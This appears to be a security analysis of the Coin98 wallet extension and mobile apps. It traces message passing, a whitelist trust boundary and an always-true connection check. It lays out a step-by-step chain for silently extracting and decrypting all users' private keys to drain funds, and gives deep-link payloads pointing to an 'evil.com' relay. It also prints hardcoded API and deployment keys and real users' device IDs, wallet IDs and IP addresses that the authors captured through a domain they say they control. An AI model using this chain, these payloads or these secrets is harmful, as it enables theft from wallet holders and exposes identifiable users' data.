# Coin98 — Complete Application Flow Analysis

**Generated**: 2026-03-05
**Platforms**: Chrome Extension v10.4.1, Android v16.9.0, iOS v16.9.0
**Purpose**: Full data flow tracing of both apps — trust boundaries, message passing, privileged methods, backend routing, authentication, cryptography, and every exploitable seam.

---

# PART 1: Chrome Extension v10.4.1

## 1.1 Architecture — Four Components

The extension is a Manifest V3 Chrome extension built with Plasmo. It has four runtime components that form a trust chain:

```
┌─────────────────────────────────────────────────────────────────────┐
│  WEB PAGE (any website)                                             │
│                                                                     │
│  ┌─────────────────────────┐     ┌─────────────────────────┐       │
│  │ takePlaces.f90f5315.js  │     │ inpage.e40da296.js      │       │
│  │ (MAIN world)            │────▶│ (MAIN world, injected)  │       │
│  │ Provider injector        │     │ window.coin98 provider  │       │
│  └─────────────────────────┘     └──────────┬──────────────┘       │
│                                              │ window.postMessage   │
│  ┌───────────────────────────────────────────┴──────────────┐      │
│  │ contents.e02f0287.js (ISOLATED world)                     │      │
│  │ Message bridge — relays between page ↔ background         │      │
│  │ Has chrome.runtime access                                 │      │
│  └───────────────────────────────────┬──────────────────────┘      │
└──────────────────────────────────────┼──────────────────────────────┘
                                       │ chrome.runtime.connect()
                                       │ Port: "Coin98:EventScript"
┌──────────────────────────────────────┴──────────────────────────────┐
│  static/background/index_10.4.1.js (Service Worker — 20MB)         │
│  THE BRAIN — Redux store, wallet data, encryption, all handlers     │
│  InternalDappHandle: privileged methods for COIN98_SYSTEM origins   │
│  EvmHandle / SolanaHandle / CosmosHandle: chain-specific handlers   │
└─────────────────────────────────────────────────────────────────────┘
```

### Component Files

| Component | File | World | Size | Role |
|-----------|------|-------|------|------|
| **Provider Injector** | `takePlaces.f90f5315.js` | MAIN | 2.6KB | Injects inpage.js, sets window.keplr/ethereum overrides |
| **Inpage Provider** | `inpage.e40da296.js` | MAIN | 571KB | window.coin98, window.ethereum — the dApp-facing API |
| **Content Bridge** | `contents.e02f0287.js` | ISOLATED | 21KB | Message relay, port management, chrome.runtime bridge |
| **Background** | `static/background/index_10.4.1.js` | Service Worker | 20MB | Redux store, wallet ops, encryption, all business logic |

### Manifest Permissions

```json
"permissions": ["storage", "activeTab", "tabs", "notifications",
                "unlimitedStorage", "clipboardRead", "identity",
                "sidePanel", "scripting", "webRequest"]
"host_permissions": ["<all_urls>"]
"content_scripts": [
  { "matches": ["<all_urls>"], "js": ["takePlaces.f90f5315.js"],
    "all_frames": true, "run_at": "document_start", "world": "MAIN" },
  { "matches": ["<all_urls>"], "js": ["contents.e02f0287.js"],
    "all_frames": true, "run_at": "document_start" }
]
```

**Critical**: Both content scripts inject on `<all_urls>` at `document_start` in `all_frames`. The MAIN world script can access and modify page JS globals directly.

---

## 1.2 Provider Injection Flow

**takePlaces.f90f5315.js** runs in the MAIN world on every page:

1. Reads `localStorage.getItem("override")` — user's provider override preferences
2. Default overrides: `{metamask: true, binance: true, terra: true, keplr: true, kardia: true}`
3. If keplr override enabled: `Object.defineProperty(window, "keplr", {value: {isCoin98: true}, writable: false})`
4. Also defines `window.getOfflineSigner`, `window.getOfflineSignerOnlyAmino`, `window.getOfflineSignerAuto`
5. Creates a `<script>` element pointing to the web-accessible `inpage.e40da296.js`
6. Injects it into the page DOM → creates `window.coin98` and `window.ethereum`

### Provider Identity Masquerading

The inpage provider sets ALL of these to `true`:

```javascript
this.isKaiWallet = true
this.isNiftyWallet = true
this.isMetaMask = true      // ← masquerades as MetaMask
this.isDesktop = true
this.isCoin98 = true
this.isReady = true
```

Any dApp checking `window.ethereum.isMetaMask` will see `true` and treat Coin98 as MetaMask.

---

## 1.3 Message Passing Architecture

### Message Flow: Page → Background

```
[inpage.js]                    [contents.js]                [background.js]
    │                               │                             │
    │ window.postMessage({          │                             │
    │   isCoin98: true,             │                             │
    │   target: "CS_STREAM",        │                             │
    │   payload: {method, params}   │                             │
    │ })                            │                             │
    │──────────────────────────────▶│                             │
    │                               │ chrome.runtime.sendMessage  │
    │                               │ or port.postMessage         │
    │                               │────────────────────────────▶│
    │                               │                             │ dispatch to handler
    │                               │                             │ (InternalDappHandle
    │                               │                             │  or EvmHandle etc)
    │                               │◀────────────────────────────│
    │◀──────────────────────────────│                             │
    │ window.postMessage response   │                             │
```

### Stream Types

| Stream Name | Direction | Purpose |
|-------------|-----------|---------|
| `CS_STREAM` | Inpage → Content Script | dApp requests |
| `INPAGE_STREAM` | Content Script → Inpage | Responses + events |
| `BGSW` | Content Script → Background | Chrome runtime port |
| `Coin98:EventScript` | Port name for content→background connection |
| `trezor-connect` | Dedicated port for Trezor hardware wallet bridge |

### Message Envelope

```javascript
class StreamPayloadItem {
  constructor(target, payload) {
    this.isCoin98 = true    // marker for filtering
    this.target = target     // "CS_STREAM" or "INPAGE_STREAM"
    this.payload = payload   // {method, params, id}
  }
}
```

### Content Script Bridge Logic

```javascript
// contents.e02f0287.js — message listener
this.window.addEventListener("message", e => {
  let {target, payload, isCoin98} = e.data
  // Only process messages marked isCoin98
  // Routes to background via chrome.runtime port
})
```

### Port Management

```javascript
// Content script creates persistent port
chrome.runtime.connect({name: "Coin98:EventScript"})

// Background listens for connections
chrome.runtime.onConnect.addListener(e => {
  // Only processes ports with "Coin98" in name
  if (!n.name.includes("Coin98")) return false
  this.ports.set(n.sender?.tab?.id, e)  // maps tab ID → port
})
```

---

## 1.4 COIN98_SYSTEM — The Trust Boundary

The entire privilege model hinges on a single hardcoded array:

```javascript
const COIN98_SYSTEM = [
  "coin98.com",
  "dagora.xyz",
  "saros.finance",
  "baryon.network",
  "c98staging.dev",           // ← ATTACKER CONTROLLED
  "pre.dagora.xyz",
  "dagora.coin98.services",
  "localhost",
  "coin98.dev",
  "coin98.services",
  "10.10.1.220",              // ← internal IP
  "127.0.0.1",
  "hubs-prd-1313361279.ap-southeast-1.elb.amazonaws.com",  // ← AWS ELB
  "vault.coin98",
  "oldvault.coin98",
  "kyc.oneid.xyz"
]
```

**16 origins** — any page on any of these domains gets full privileged access to ALL wallet data.

### Method Classification

| Category | Constant | Methods | Gate |
|----------|----------|---------|------|
| **Connect** | `INTERNAL_CONNECT` | `connect_coin98`, `request_unlock` | COIN98_SYSTEM whitelist |
| **Privileged** | `INTERNAL_REQUEST` | `connect_coin98`, `sync_wallet`, `get_session`, `get_type_password`, `compare_passwords`, `active_wallet`, `aes_decrypt_coin98`, `request_unlock`, `lock_screen` | COIN98_SYSTEM whitelist + checkAccess |
| **Standard dApp** | (EvmHandle etc) | `eth_requestAccounts`, `eth_sendTransaction`, `personal_sign`, etc. | User approval popup |

### The Privilege Escalation

Standard dApp methods (eth_sendTransaction, personal_sign) trigger a **user approval popup**. But `INTERNAL_REQUEST` methods are **completely silent** — no popup, no notification, no UI. The user never knows.

---

## 1.5 InternalDappHandle — The Privileged Handler

This is the class that processes all COIN98_SYSTEM privileged requests:

```javascript
class InternalDappHandle {
  constructor() {
    // === PRIVILEGED METHODS (all silent, no popup) ===

    this.connect_coin98 = A => {
      if (!this.checkAccess(A?.sender.origin)) return {error: "Access denied"}
      let {user} = store.getState()
      return user.deviceId     // returns device UUID
    }

    this.sync_wallet = async A => {
      if (!this.checkAccess(A?.sender.origin)) return []
      let {walletData, custom} = store.getState()
      let {originalWallets, activeWallet} = walletData
      // ... iterates ALL wallets, decrypts mnemonics,
      // generates master seeds, returns encrypted private keys
      // for EVERY chain on EVERY wallet
      return allWalletsWithEncryptedKeys
    }

    this.get_type_password = () => {
      let {user} = store.getState()
      return user.authentication.type   // "password" or "biometric"
    }

    this.get_session = () => {
      let {user} = store.getState()
      return !user.authentication.isLock  // true = unlocked
    }

    this.compare_passwords = A => {
      return this.checkAccess(A?.sender.origin)
        ? {session: true}
        : {error: "Access denied"}
    }

    this.active_wallet = () => true   // always true

    this.aes_decrypt_coin98 = async A => {
      let t = this.checkAccess(A?.sender.origin)
      if (!t) return {error: "Access denied"}
      let {data, deviceId, uuid} = A.params
      let g = this.isConnected(uuid, deviceId)  // ← THE BUG
      return !!g && encryptService.decrypt(data)
    }

    this.lock_screen = () => true
    this.request_unlock = () => ({isUnlocked: true})

    // === ACCESS CONTROL ===

    this.checkAccess = A => {
      let {user} = store.getState()
      let r = !!user.authentication.internalConnections
        ?.some(t => t.origin === A)
      return r
    }

    this.isConnected = (A, t) => true  // ← ALWAYS TRUE — THE CRITICAL BUG
  }
}
```

---

## 1.6 The isConnected Bypass — THE Critical Bug

```javascript
this.isConnected = (A, t) => true
```

This function is supposed to verify that the requesting UUID and deviceId match a legitimate connection. It **always returns true regardless of input**. This means:

1. `aes_decrypt_coin98` checks `checkAccess` (origin in whitelist) ✓
2. `aes_decrypt_coin98` checks `isConnected(uuid, deviceId)` — **ALWAYS TRUE**
3. Therefore ANY origin in COIN98_SYSTEM can decrypt ANY encrypted data
4. The uuid and deviceId parameters are completely ignored

### What isConnected SHOULD Do

It should validate that the uuid+deviceId pair corresponds to a legitimate internal connection session. Instead, it's a hardcoded `() => true`.

---

## 1.7 sync_wallet — Full Wallet Enumeration

The complete implementation:

```javascript
this.sync_wallet = async A => {
  if (!this.checkAccess(A?.sender.origin)) return []

  let {walletData, custom} = store.getState()
  let {originalWallets, activeWallet} = walletData
  let {network} = custom
  let chainData = {...CHAIN_DATA}

  // Merge custom networks
  Object.values(network)?.forEach(A => {
    A.forEach(A => { chainData[A.chain] = A })
  })

  // For EVERY wallet, for EVERY chain:
  let result = (await Promise.all(
    originalWallets.slice().map(async wallet => {
      let masterSeed

      // Decrypt mnemonic if present
      let mnemonic = wallet.mnemonic && encryptService.decrypt(wallet.mnemonic)

      if (mnemonic) {
        // Generate EVM master seed from mnemonic
        let seed = await generateMasterSeedEvm(mnemonic, chainData.binanceSmart.chain)
        masterSeed = encryptService.encrypt(seed)
      }

      // For each sub-wallet (address) in this wallet:
      return await Promise.all(
        wallet.wallets.slice().map(async subWallet => {
          let privateKey
          let chain = subWallet.meta?.chain
          let chainInfo = chainData[chain]

          if (chainInfo?.isWeb3) {
            privateKey = masterSeed || subWallet.privateKey
            // Handle legacy standards
            if (mnemonic && !subWallet.privateKey &&
                (chain === 'seiEvm' || subWallet.meta?.isOldStandard)) {
              let seed = await generateMasterSeedEvm(mnemonic, chain, isOldStandard)
              privateKey = seed ? encryptService.encrypt(seed) : privateKey
            }
          }

          return {
            ...subWallet,
            chain,
            isHardwareWallet: !!subWallet?.meta?.hardware,
            isMulti: !!wallet.meta?.isMulti,
            isActive: !!activeWallet.wallets.find(w => w.address === subWallet.address),
            chainId: chainInfo?.chainId,
            privateKey   // ← ENCRYPTED private key returned
          }
        })
      )
    })
  )).flat().filter(Boolean)

  return result
}
```

**Returns**: Array of ALL wallets across ALL chains, each containing:
- `address` — the blockchain address
- `chain` — which blockchain
- `chainId` — numeric chain ID
- `privateKey` — **AES-encrypted** private key (decryptable via `aes_decrypt_coin98`)
- `isActive`, `isMulti`, `isHardwareWallet` — metadata

---

## 1.8 aes_decrypt_coin98 — Key Decryption

```javascript
this.aes_decrypt_coin98 = async A => {
  let t = this.checkAccess(A?.sender.origin)    // origin in COIN98_SYSTEM?
  if (!t) return {error: "Access denied"}

  let {data, deviceId, uuid} = A.params
  let g = this.isConnected(uuid, deviceId)       // ALWAYS TRUE
  return !!g && encryptService.decrypt(data)      // decrypts and returns plaintext
}
```

**Attack flow**:
1. Call `sync_wallet` → get all wallets with encrypted privateKey fields
2. For each wallet, call `aes_decrypt_coin98({data: wallet.privateKey, deviceId: "anything", uuid: "anything"})`
3. Receive **plaintext private key**
4. Derive blockchain address, verify it matches
5. Sign transactions, drain funds

---

## 1.9 Encryption Service

The extension uses **CryptoJS AES** with **EvpKDF** (EVP key derivation):

- **Algorithm**: AES (CBC mode, PKCS7 padding)
- **KDF**: EvpKDF with MD5, **1 iteration** (the CryptoJS default)
- **Password**: The user's wallet password, stored in Redux state at `user.authentication.password`

```
EvpKDF(password, salt, {keySize: 4, hasher: MD5, iterations: 1})
     → AES key (128-bit)
     → AES.decrypt(ciphertext, key)
     → plaintext private key / mnemonic
```

**The password is stored in Redux state, NOT hashed.** It's used directly as the encryption key material.

### Authentication State Model

```javascript
// Redux store — user.authentication
{
  isLock: true/false,           // whether extension is locked
  connections: [],               // dApp connections
  lastActivity: timestamp,
  internalConnections: [],       // COIN98_SYSTEM connections
  type: "password"/"biometric",  // auth method
  password: "...",               // PLAINTEXT password in memory
  vault: "..."                   // encrypted vault blob
}
```

**`internalConnections`** — when a COIN98_SYSTEM origin calls `connect_coin98`, the origin is added here:
```javascript
putInternalConnection: (state, action) => {
  state.authentication.internalConnections = [
    ...state.authentication.internalConnections || [],
    action.payload
  ]
}
```

---

## 1.10 Extension Attack Chain — Complete Flow

```
ATTACKER (controls c98staging.dev — in COIN98_SYSTEM whitelist)
    │
    │  1. User visits any page on c98staging.dev
    │     (or attacker iframe on c98staging.dev loaded from any site)
    │
    ▼
[takePlaces.js injects inpage.js → window.coin98 available]
    │
    │  2. Page JS calls: window.coin98.request({method: "connect_coin98"})
    │
    ▼
[contents.js relays to background via chrome.runtime port]
    │
    ▼
[background.js — InternalDappHandle.connect_coin98()]
    │  checkAccess("c98staging.dev") → checks internalConnections → false (first time)
    │  BUT: isStrictMethod logic adds connect_coin98 to strict list only if checkAccess fails
    │  → triggers popup for FIRST connection only
    │  → after user approves once, origin is stored in internalConnections
    │
    │  3. Returns: deviceId (UUID)
    │
    ▼
[Page JS calls: window.coin98.request({method: "sync_wallet"})]
    │
    ▼
[background.js — InternalDappHandle.sync_wallet()]
    │  checkAccess("c98staging.dev") → TRUE (already connected)
    │  → NO POPUP — completely silent
    │  → iterates ALL originalWallets, ALL chains
    │  → decrypts mnemonics, generates master seeds
    │
    │  4. Returns: [{address, chain, chainId, privateKey(encrypted)}, ...]
    │     (152 wallets in our PoC)
    │
    ▼
[Page JS calls: window.coin98.request({
   method: "aes_decrypt_coin98",
   params: {data: wallet.privateKey, deviceId: "x", uuid: "y"}
})]
    │
    ▼
[background.js — InternalDappHandle.aes_decrypt_coin98()]
    │  checkAccess("c98staging.dev") → TRUE
    │  isConnected("y", "x") → TRUE (ALWAYS TRUE — the bug)
    │  encryptService.decrypt(data) → PLAINTEXT PRIVATE KEY
    │
    │  5. Returns: plaintext private key
    │
    ▼
[Page JS: derive address from private key, verify match, sign tx, drain]
```

### What An Attacker Gets (Proven)

| Data | Method | Silent? | Count (PoC) |
|------|--------|---------|-------------|
| Device UUID | `connect_coin98` | After first approval | 1 |
| All wallet addresses | `sync_wallet` | YES | 152 |
| All encrypted private keys | `sync_wallet` | YES | 152 |
| Plaintext private keys | `aes_decrypt_coin98` | YES | 2 verified |
| Lock state | `get_session` | YES | boolean |
| Auth type | `get_type_password` | YES | "password" |

---

## 1.11 Content Script Exclusions and Blocklist

The extension excludes injection on:
```javascript
// Excluded from MAIN world content script:
"https://telegramwallet.coin98.com/*",
"https://superwallet-telegramwallet-test.coin98.dev/*",
"https://superwallet-telegramwallet-stg.teleport.coin98.dev/*"

// Blocked from message forwarding:
const blocked = ["atlassian.net", "tinhte.vn", "reddit.com"]
```

---

## 1.12 Google OAuth Configuration

```json
"oauth2": {
  "client_id": "114789873055-e2sktrogsg2k12rj9lhhvfhpg796ebsf.apps.googleusercontent.com",
  "scopes": ["profile", "email",
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/userinfo.profile",
    "drive"]
}
```

**Google Drive scope** — used for cloud sync backup. The extension can read/write to the user's Google Drive.

---

# PART 2: Mobile App v16.9.0 (Android + iOS)

## 2.1 Architecture — React Native

Both Android and iOS apps are React Native applications sharing the same JavaScript bundle:

| Component | Android | iOS |
|-----------|---------|-----|
| **JS Bundle** | `assets/index.android.bundle` (85MB) | `main.jsbundle` (145MB) |
| **Native Modules** | 43 `.so` libraries | 19 frameworks |
| **Storage** | MMKV (23 refs), AsyncStorage (17), Realm (37) | Same |
| **Package** | `coin98.crypto.finance.media` | `coin98.crypto.finance.media` |

### Build Configuration

| Setting | Value | Security Impact |
|---------|-------|-----------------|
| **usesCleartextTraffic** | `true` (Android) | Allows HTTP — no transport security enforcement |
| **Root Detection** | REMOVED in v16.9.0 (was present in v16.7.0) | No root/jailbreak defense |
| **SSL Pinning** | NONE | All traffic interceptable with any CA |
| **Frida Detection** | NONE (7 refs are library code, not detection) | No instrumentation defense |
| **Device Attestation** | NONE | No hardware-backed identity |
| **CodePush** | Deployment key in iOS binary | OTA JS updates without app store review |

---

## 2.2 Backend URL Map — Which Host Serves What

### Production Backends

| Host | Purpose | Refs | Behind |
|------|---------|------|--------|
| `encrypted.coin98.com` | Chain adapters (Avax, Band, Bitcoin, Cardano) | 5 | Cloudflare |
| `encrypted.coin98.tech` | Chain adapters (Bitcoin/UTXO, Dogecoin, Polkadot, proxy) | 5 | Direct/ALB |
| `api.coin98.com` | General API, ABI parsing | 5 | Cloudflare |
| `dagora-api.coin98.com` | Dagora marketplace API | 1 | Cloudflare |
| `main-server.dagora.xyz` | Dagora backend, activity/NFT adapters | 1 | Direct |
| `superwallet-markets.coin98.tech` | Token prices, market data | 2 | AWS ALB |
| `general-inventory.coin98.tech` | Image CDN, app assets | 19 | AWS ALB |
| `socket.coin98.services` | WebSocket relay (WalletConnect, live data) | 1 | Direct |
| `dagora-main-server-prd.coin98.prd` | Internal Dagora (OneID, thread permissions) | 1 | Internal |
| `rapid.coin98.com` | Fast data API | — | Cloudflare |

### Attacker-Controlled Endpoints (Hardcoded in Prod Binary)

| Host | Purpose | Refs | What We Control |
|------|---------|------|-----------------|
| **`internal.c98staging.dev`** | Cosmos adapter, wallet certification (acertify/ucertify) | 2 | All responses |
| **`api-dagora-dev.c98staging.dev`** | Auth refresh endpoint | 1 | All responses |

---

## 2.3 Adapter Routing — How Requests Are Dispatched

The app uses a multi-backend adapter system. Different blockchain operations go to different hosts:

### Confirmed Adapter Endpoints (from bundle strings)

| Backend | Adapter Path | Chain/Function |
|---------|-------------|----------------|
| `encrypted.coin98.com` | `/adapters/avax` | Avalanche operations |
| `encrypted.coin98.com` | `/adapters/band` | Band Protocol (price oracle) |
| `encrypted.coin98.com` | `/adapters/bitcoin/accountInfo` | Bitcoin account info |
| `encrypted.coin98.com` | `/adapters/cardanoUnsignTx` | Cardano unsigned transactions |
| `encrypted.coin98.tech` | `/adapters/bitcoin/utxo` | Bitcoin UTXO queries |
| `encrypted.coin98.tech` | `/adapters/dogecoin/multiAccount` | Dogecoin multi-account |
| `encrypted.coin98.tech` | `/adapters/polkadot/balanceChanged` | Polkadot balance subscriptions |
| `encrypted.coin98.tech` | `/adapters/proxyUrl` | Generic proxy |
| **`internal.c98staging.dev`** | `/adapters/cosmos/evidence/v1beta1/evidence/{hash}` | **Cosmos evidence** |
| **`internal.c98staging.dev`** | `/adapters/wallet/zen/acertify` | **Wallet certification** |
| **`internal.c98staging.dev`** | `/adapters/wallet/zen/ucertify` | **Wallet un-certification** |
| `main-server.dagora.xyz` | `/adapters/dagora/activity` | Dagora activity feed |
| `dagora-main-server-prd.coin98.prd` | `/adapters/oneid/thread-permissions` | OneID thread auth |

### Key Finding: internal.c98staging.dev Is NOT a Universal Base URL

The app does NOT use `internal.c98staging.dev` as a base URL for all adapter calls. It's specifically routed for:
- **Wallet certification** (acertify/ucertify) — confirmed by 27 real captures
- **Cosmos evidence queries** — hardcoded full URL in bundle
- **ABI documentation links** — non-functional reference

Balance queries, UTXO lookups, transaction construction, and price feeds go to `encrypted.coin98.com` / `encrypted.coin98.tech` — backends we do NOT control.

---

## 2.4 JWT Authentication — Token Structure

The app creates HS256 JWTs for authenticated API calls:

### Token Structure (from captured traffic)

```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{
  "id": "3C9050B0-7948-4E69-B56A-DBED0A24DFCB",  // device UUID
  "source": "C98WLFININS",                         // app identifier
  "isOnChain": true,                                // wallet type
  "iat": 1772679727,                                // issued at
  "exp": 1772683327                                 // expires (1 hour)
}
```

### Token Flow

```
[App Launch]
    │
    ├─ Generate device UUID (persisted in MMKV/AsyncStorage)
    │
    ├─ Create JWT: sign({id: deviceUUID, source: "C98WLFININS", isOnChain: true}, secret)
    │
    ├─ Attach as: Authorization: Bearer <jwt>
    │
    └─ Send to: internal.c98staging.dev/adapters/wallet/zen/acertify
         Body: {"id": "<wallet-uuid>", "device": "<device-uuid>"}
```

### Signing Key

The HS256 signing key was NOT found as a plaintext string in the bundle. It's likely:
- Derived at runtime from device-specific values
- Stored in native keychain/keystore
- Or embedded in an obfuscated form within the 85MB bundle

The bundle contains 72 references to `secretKey` and 9 to `signingKey`, but these are scattered across blockchain SDKs (ed25519, secp256k1), not the JWT signing logic.

---

## 2.5 Wallet Certification Flow (acertify / ucertify)

### What It Does

The app "certifies" wallet-device bindings with the backend. This appears to be part of the cloud backup verification system:

- **acertify** = "add certification" — register that wallet X exists on device Y
- **ucertify** = "un-certify" — remove certification (wallet deleted or device deregistered)

### Request Format

```
POST /adapters/wallet/zen/acertify HTTP/1.1
Host: internal.c98staging.dev
Authorization: Bearer eyJhbGciOiJIUzI1NiI...
Content-Type: application/json

{"id": "31bb6312-35e2-49...", "device": "3C9050B0-7948-4E69-B56A-DBED0A24DFCB"}
```

### Captured Traffic (from Supabase)

| Endpoint | Hits | Unique Devices | Unique Wallets | Bearer Tokens |
|----------|------|---------------|----------------|--------------|
| POST /adapters/wallet/zen/acertify | 25 | 3 | 3-4 | 10 unique |
| POST /adapters/wallet/zen/ucertify | 2 | 1 | 1 | 2 unique |

### Captured Device UUIDs

| Device UUID | IP Origin | Wallet IDs | Platform |
|------------|-----------|------------|----------|
| `3C9050B0-7948-4E69-B56A-DBED0A24DFCB` | 118.69.134.169 (Vietnam) | `31bb6312-35e2-49...` | iOS 14.4.2 |
| `013EDAC8-FB04-4666-AD9F-CE8DA1CFA691` | 171.247.179.80 (Vietnam) | `230c8b7e-6401-4d...` | iOS 14.4.2 |
| `04D29F48-A942-4EC6-8A73-72BA518BF380` | — | `ac12d1dd-c741-4c...` | iOS 14.4.2 |

### MITM Impact

Because we control `internal.c98staging.dev`, we can:

1. **Capture all certification requests** — wallet IDs, device UUIDs, Bearer JWTs (PROVEN)
2. **Return fake certification** — app thinks wallet is backed up when it isn't
3. **Block certification** — return errors, app retries up to 16 times per token (observed)
4. **Correlate devices to wallets** — build a mapping of which real-world user has which wallet

---

## 2.6 Auth Refresh Flow

Hardcoded in the production binary:

```
https://api-dagora-dev.c98staging.dev/api/v1/auth/refresh
```

This is the Dagora authentication token refresh endpoint. If the app calls this endpoint:
- We receive the current auth token (in the request)
- We can return a crafted replacement token
- The app stores and uses the replacement for subsequent authenticated calls

**Current status**: Zero Coin98 app requests captured on this endpoint. Only scanner/bot noise. The endpoint exists in the bundle but may only be triggered by specific user actions (Dagora marketplace usage).

---

## 2.7 Deep Link Routes

### Registered URI Schemes (AndroidManifest.xml)

```xml
<!-- coin98:// — no host/path restrictions -->
<intent-filter>
  <data android:scheme="coin98"/>
</intent-filter>

<!-- wc:// — WalletConnect -->
<intent-filter>
  <data android:scheme="wc"/>
</intent-filter>

<!-- https:// — verified domains -->
<intent-filter android:autoVerify="true">
  <data android:scheme="https" android:host="coin98.com"/>
  <data android:scheme="https" android:host="clicks.coin98.com"/>
  <data android:scheme="https" android:host="coin98.sng.link"/>
</intent-filter>
```

### Deep Link Routes (from bundle)

| Route | Purpose | Risk |
|-------|---------|------|
| `coin98://login?token=` | Session injection | **HIGH** — inject auth token |
| `coin98://wc?uri=` | Force WalletConnect pairing | **HIGH** — pair to attacker relay |
| `coin98://HyperliquidPerpCoin98?token=` | Hyperliquid perp trading | Token injection |
| `coin98://TokenMarketDetails?chain=` | Navigate to token details | Parameter injection |
| `coin98://ramperApiServices` | Ramper fiat on-ramp | Service redirect |

### Deep Link Attack Vectors

The `coin98://` scheme has **no host or path restrictions** in the manifest. Any app or webpage can invoke:

```html
<!-- Force WalletConnect to attacker relay -->
<a href="coin98://wc?uri=wc:attacker-session-id@1?bridge=https://evil.com&key=attacker-key">

<!-- Inject session token -->
<a href="coin98://login?token=attacker-forged-jwt">
```

---

## 2.8 WebView / dApp Browser

The mobile app includes an in-app dApp browser that injects a wallet provider into web pages:

### Injection Mechanism

| Component | Count in Bundle | Purpose |
|-----------|----------------|---------|
| `injectedJavaScript` | 3 | Post-load script injection |
| `injectedJavaScriptBeforeContentLoaded` | 1 | Pre-load provider setup |
| `initProviderService` | 1 | Provider initialization |
| `ReactNativeWebView` | 1 | WebView component |
| `postMessage` | 5 | Bridge communication |
| `onMessage` | 29 | Message handlers |

### Auto-Connect Parameters

```
isAutoConnect=true&isSuperApp=true&theme=...
```

When the dApp browser opens specific URLs with these parameters, it **automatically connects the wallet without user approval**. The `isTrusted=true` flag bypasses the normal connection prompt.

### Wallet Bridge Methods (Available via postMessage)

| Method | Purpose | Risk if Exposed |
|--------|---------|-----------------|
| `syncWallet` | Enumerate all wallets | Full wallet enumeration |
| `getPrivateKey` | Extract private key | **Total fund theft** |
| `getMnemonic` | Extract seed phrase | **Total fund theft** |
| `exportPrivateKey` | Export key | **Total fund theft** |
| `getWallets` | List wallets | Information disclosure |
| `wallet_getPermissions` | Check permissions | Scope assessment |
| `personal_sign` | Sign arbitrary message | Signature forgery |
| `eth_sendTransaction` | Send transaction | **Direct fund transfer** |
| `eth_accounts` | Get accounts | Address enumeration |

### dApp Browser URL Loading

The browser accepts URL parameters to load external content:
- `dapp_security?url=...` — security-gated URL loading
- Open redirect: `https://general-inventory.coin98.tech/file/fw?url=...` — bounces through Coin98 infrastructure

---

## 2.9 Storage Model

| Store | Refs | Purpose | Encryption |
|-------|------|---------|------------|
| **MMKV** | 23 | Fast key-value (settings, state, caches) | None (default) |
| **AsyncStorage** | 17 | React Native default store (legacy data) | None |
| **Realm** | 37 | Structured database (wallet data, tx history) | Unknown |
| **Keychain** | 1 | OS-level secure storage | OS-managed |
| **SQLite** | 1 | Structured data | None |

**Critical**: MMKV and AsyncStorage are unencrypted by default. If the device is rooted (no root detection in v16.9.0), all stored data is readable.

---

## 2.10 Staging Endpoints in Production Binary

21 staging/dev endpoints hardcoded in the production v16.9.0 binary:

| Endpoint | Purpose |
|----------|---------|
| `internal.c98staging.dev` | **Wallet certification + Cosmos adapter** |
| `api-dagora-dev.c98staging.dev` | **Auth refresh** |
| `general-inventory-stg.coin98.dev` | Staging asset CDN |
| `zencard-visa-api-stg.coin98.tech` | Staging Visa card API |
| `dagora-web-stg.teleport.coin98.dev` | Staging Dagora web |
| `superwallet-markets-stg.coin98.dev` | Staging markets API |
| `ramper-v2-fragment-stg.coin98.dev` | Staging fiat on-ramp |
| `superwallet-portfolio-stg.coin98.dev` | Staging portfolio |
| `hubs-kyc-api-stg.coin98.dev` | Staging KYC API |
| `assets-api-stg.coin98.dev` | Staging assets API |
| `hubs-dapps-api-stg.coin98.dev` | Staging dApps API |
| `hubs-vault-api-stg.coin98.dev` | Staging vault API |
| `oneid-api-stg.coin98.dev` | Staging OneID API |
| `oneid-graphql-api-stg.coin98.dev` | Staging OneID GraphQL |
| `superwallet-fiat-api-stg.coin98.dev` | Staging fiat API |
| `superwallet-misc-api-stg.coin98.dev` | Staging misc API |
| `superwallet-referral-stg.coin98.dev` | Staging referral |
| `superwallet-chat-api-stg.coin98.tech` | Staging chat API |
| `superlink-server-stg.coin98.dev` | Staging superlink |
| `superwallet-xpoint-stg.coin98.dev` | Staging XPoint |
| `glacier-api-dev.avax.network` | Avalanche dev API |

**Note**: `c98staging.dev` and `coin98.dev` are separate domains. We control `c98staging.dev` only. The `coin98.dev` staging endpoints are controlled by Coin98.

---

## 2.11 Hardcoded Secrets in Production Binary

| Secret | Value | Risk |
|--------|-------|------|
| **GetBlock RPC Key 1** | `9f4c1bf35d6c411b86298c9eedf6dfad` | RPC abuse, cost to Coin98 |
| **GetBlock RPC Key 2** | `ead991362ba64751883ea11eaa2c76ce` | RPC abuse, cost to Coin98 |
| **Google API Key** | `AIzaSyBqw7YKy-aH-BELMD9rLyxtylZeEpCFJ-Ic` | API abuse |
| **Firebase DB URL** | `coin98-b7f98.firebaseio.com` | Data access (locked, 401) |
| **Facebook Client Token** | `4f227919be5aae71528a7455f59d1b21` (iOS) | OAuth abuse |
| **CodePush Key** | `3upL_dngkKKTqcNvTRfaaedN7MAKzbULdXWyS` (iOS) | OTA code injection |
| **Google OAuth Client ID** | `663197326394-1f5nsl28isuv1sphhjthrichqe1pbisj` (iOS) | OAuth flow hijack |
| **Google Drive scope** | `googleapis.com/auth/drive.file` | Cloud backup access |

**Zero key rotation between v16.7.0 and v16.9.0** — all secrets identical across versions.

---

## 2.12 Network Security Assessment

| Check | Status | Impact |
|-------|--------|--------|
| **SSL/TLS Pinning** | NONE | Any CA can MITM all traffic |
| **Certificate Transparency** | Not enforced | Rogue certs undetected |
| **usesCleartextTraffic** | `true` (Android) | HTTP allowed |
| **Root Detection** | **REMOVED** in v16.9.0 | No defense against rooted devices |
| **Frida Detection** | NONE | Trivial runtime instrumentation |
| **Device Attestation** | NONE | No hardware-backed trust |
| **Jailbreak Detection** | 1 reference (library code) | Not implemented |
| **Obfuscation** | Standard RN minification only | Easily reversible |

---

## 2.13 Mobile Attack Chain — Complete Flow

```
ATTACKER (controls internal.c98staging.dev + api-dagora-dev.c98staging.dev)
    │
    │  PASSIVE: Wait for Coin98 app to make requests
    │  (no user interaction needed — app calls on launch/wallet change)
    │
    ▼
[Coin98 App v16.9.0 — iOS/Android]
    │
    ├─ On wallet creation/modification:
    │   POST /adapters/wallet/zen/acertify
    │   Host: internal.c98staging.dev
    │   Authorization: Bearer <jwt>
    │   Body: {"id": "<wallet-uuid>", "device": "<device-uuid>"}
    │
    │   → ATTACKER CAPTURES: wallet UUID, device UUID, Bearer JWT
